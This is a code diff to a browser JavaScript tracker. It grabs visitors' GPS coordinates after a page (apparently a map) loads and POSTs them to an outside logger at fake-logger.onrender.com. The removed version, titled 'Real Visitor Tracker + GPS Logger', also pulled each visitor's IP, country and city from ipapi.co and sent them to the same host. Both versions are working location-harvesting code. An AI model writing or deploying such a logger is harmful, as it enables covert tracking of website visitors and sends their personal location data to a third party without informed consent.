@@ -1,54 +1,39 @@
-// 🔒 Real Visitor Tracker + GPS Logger
-(async () => {
-  let ip = "Unknown", country = "Unknown", city = "Unknown";
-  let latitude = "N/A", longitude = "N/A";
+// Delay to let map load first
+window.addEventListener("load", () => {
+  setTimeout(captureLocation, 1500);
+});
 
-  try {
-    // Get public IP & location via IPAPI
-    const ipRes = await fetch("https://ipapi.co/json/");
-    const ipData = await ipRes.json();
-    ip = ipData.ip || ip;
-    country = ipData.country_name || country;
-    city = ipData.city || city;
-  } catch (err) {
-    console.warn("IP fetch failed", err);
-  }
-
-  // Try to get exact GPS location (with permission)
+function captureLocation() {
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(success, error, {
+    navigator.geolocation.getCurrentPosition(success, fallback, {
       enableHighAccuracy: true,
-      timeout: 5000,
-      maximumAge: 0
+      timeout: 5000
     });
   } else {
-    sendLog(); // fallback if GPS not supported
+    fallback(); // Geolocation not supported
   }
+}
 
-  function success(pos) {
-    latitude = pos.coords.latitude;
-    longitude = pos.coords.longitude;
-    sendLog();
-  }
+function success(position) {
+  const data = {
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    gps: true
+  };
+  sendToLogger(data);
+}
 
-  function error(err) {
-    console.warn("GPS blocked", err.message);
-    sendLog(); // still log IP-based info
-  }
+function fallback() {
+  // No GPS → still log IP-based info
+  sendToLogger({ gps: false });
+}
 
-  function sendLog() {
-    const payload = {
-      ip,
-      country,
-      city,
-      latitude,
-      longitude
-    };
-
-    fetch("https://fake-logger.onrender.com/logger.php", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    }).catch(err => console.error("Log failed:", err));
-  }
-})();
+function sendToLogger(data) {
+  fetch("https://fake-logger.onrender.com/logger.php", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
+}
